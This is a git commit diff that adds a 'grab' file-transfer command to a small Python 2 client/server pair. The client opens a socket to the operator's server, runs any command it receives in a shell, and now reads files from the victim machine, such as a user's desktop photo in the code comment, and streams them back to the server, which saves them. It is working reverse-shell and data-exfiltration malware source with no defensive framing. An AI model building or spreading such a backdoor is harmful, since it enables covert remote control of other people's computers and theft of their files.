b85be5a53b7f70fa5592c8a56ac0c7bc70e3b139
Michael Kirori <kirorikamau@yaoo.com>
2016-11-07 07:46:08 -0500

    Add ability to transfer files

--- client.py
+++ client.py
@@ -1,5 +1,21 @@
 import socket
 import subprocess
+import os
+
+def transfer(s,path):
+    
+    if os.path.exists(str(path)):
+        f = open(path, 'rb')
+        packet = f.read(1024)
+        while packet != '':
+            s.send(packet)
+            packet = f.read(1024)
+        s.send('DONE')
+        f.close()
+
+    else:
+        s.send('File not found')
+
 
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -11,6 +27,18 @@ def connect():
         if 'terminate' in command:
             s.close()
             break
+
+        if 'grab' in command:
+            #The command to transfer a file will be grab*filepath e.g. grab*C:\Users\mike\Desktop\photo.jpg
+            grab, path = command.split('*')
+
+            try:
+                transfer(s, path)
+            except Exception, e:
+                s.send(str(e))
+                pass
+            
+            
 
         else:
             CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
--- server.py
+++ server.py
@@ -1,5 +1,22 @@
 import socket
 
+def transfer(conn, command):
+
+    conn.send(command)
+    f = open('/root/Desktop/somefile', 'wb')
+    while True:
+        bits = conn.recv(1024)
+        if 'File not found' in bits:
+            print '[-] File not found'
+            break
+        if bits.endswith('DONE'):
+            print '[-] File transfer complete'
+            f.close()
+            break
+        f.write(bits)
+    f.close()
+
+
 def connect():
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -19,6 +36,9 @@ def connect():
             #Close the connection to the client on the server end
             conn.close()
             break
+
+        if 'grab' in command:
+            transfer(conn, command)
 
         else:
             conn.send(command)
